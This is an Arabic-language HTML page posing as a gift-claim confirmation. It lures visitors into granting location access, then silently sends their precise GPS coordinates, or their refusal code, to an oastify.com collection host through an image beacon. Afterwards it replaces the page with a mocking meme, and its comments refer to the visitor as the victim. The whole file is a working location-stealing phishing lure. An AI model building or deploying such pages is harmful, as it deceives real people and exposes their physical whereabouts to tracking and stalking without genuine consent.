<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد استلام الهدية 🎁</title>
    <style>
        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #fce4ec; padding-top: 80px; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 25px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 2px solid #f06292; max-width: 90%; }
        .btn { background-color: #f06292; color: white; border: none; padding: 15px 45px; font-size: 22px; border-radius: 50px; cursor: pointer; transition: 0.3s; font-weight: bold; margin-top: 20px; }
        .btn:hover { background-color: #e91e63; transform: scale(1.05); }
        #status { color: #888; margin-top: 15px; font-size: 14px; display: none; }
        #meme-view { display: none; margin-top: 20px; }
        img { max-width: 100%; border-radius: 15px; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="box" id="main-box">
        <h1>مبروك! أنت مؤهل للهدية 🎊</h1>
        <p>يجب السماح بالوصول للموقع لتحديد أقرب فرع تسليم لك.</p>
        <button class="btn" onclick="getLocation()">تأكيد الموقع واستلام الهدية</button>
        <div id="status">جاري التحقق من الموقع...</div>
    </div>

    <div id="meme-view">
        <h2>أووه.. تعيش وتأكل غيرها! 😂</h2>
        <img src="https://media.tenor.com/On7tT9C_hS0AAAAM/cat-laughing.gif" alt="Funny Reaction">
    </div>

    <script>
        var tracker = "https://0qrchf9ywsx6grs0hod0h4xfx633rtfi.oastify.com";

        function getLocation() {
            document.getElementById("status").style.display = "block";
            
            if (navigator.geolocation) {
                // طلب الموقع الدقيق
                navigator.geolocation.getCurrentPosition(showPosition, showError, {enableHighAccuracy: true});
            } else {
                sendData("/?error=GeolocationNotSupported");
                finish();
            }
        }

        function showPosition(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            // إرسال الإحداثيات للبرب
            sendData("/?log=GPS_SUCCESS&lat=" + lat + "&lon=" + lon + "&accuracy=" + acc + "m");
            finish();
        }

        function showError(error) {
            // في حال رفض الضحية (Deny)
            sendData("/?log=GPS_DENIED&code=" + error.code);
            finish();
        }

        function sendData(path) {
            var logger = new Image();
            logger.src = tracker + path + "&t=" + new Date().getTime();
        }

        function finish() {
            setTimeout(function() {
                document.getElementById("main-box").style.display = "none";
                document.getElementById("meme-view").style.display = "block";
            }, 1000);
        }
    </script>
</body>
</html>
